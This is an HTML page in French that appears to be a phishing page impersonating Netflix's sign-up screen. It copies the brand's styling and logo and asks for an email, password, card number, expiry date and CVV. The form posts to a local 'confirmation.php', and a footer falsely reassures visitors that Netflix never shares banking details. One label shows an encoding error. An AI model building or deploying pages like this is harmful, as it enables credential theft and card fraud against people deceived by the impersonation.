<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inscription | Netflix</title>
    <style>
        /* Importation de la police Netflix */
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }

        body {
            background-color: #141414;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .container {
            background: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 12px;
            width: 400px;
            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
        }

        .logo {
            width: 120px;
            margin-bottom: 20px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
            color: #ccc;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            background: #333;
            color: white;
            font-size: 16px;
            outline: none;
        }

        .btn {
            background: red;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            cursor: pointer;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
        }

        .btn:hover {
            background: darkred;
            transform: scale(1.05);
            box-shadow: 0 0 15px red;
        }

        .small-text {
            font-size: 12px;
            margin-top: 15px;
            color: #bbb;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
        <form action="confirmation.php" method="POST" id="signup-form">
            <div class="input-group">
                <label for="email">Email :</label>
                <input type="email" name="email" id="email" required>
            </div>

            <div class="input-group">
                <label for="password">Mot de passe :</label>
                <input type="password" name="password" id="password" required>
            </div>

            <h3 style="margin: 20px 0;">Informations Bancaires</h3>

            <div class="input-group">
                <label for="card-number">Num√©ro de carte :</label>
                <input type="text" name="card-number" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>

            <div class="input-group">
                <label for="expiry">Date d'expiration :</label>
                <input type="text" name="expiry" id="expiry" placeholder="MM/YY" maxlength="5" required>
            </div>

            <div class="input-group">
                <label for="cvv">CVV :</label>
                <input type="text" name="cvv" id="cvv" placeholder="123" maxlength="3" required>
            </div>

            <button type="submit" class="btn">S'abonner</button>
        </form>
        <p class="small-text">Netflix ne partagera jamais vos informations bancaires.</p>
    </div>

</body>
</html>
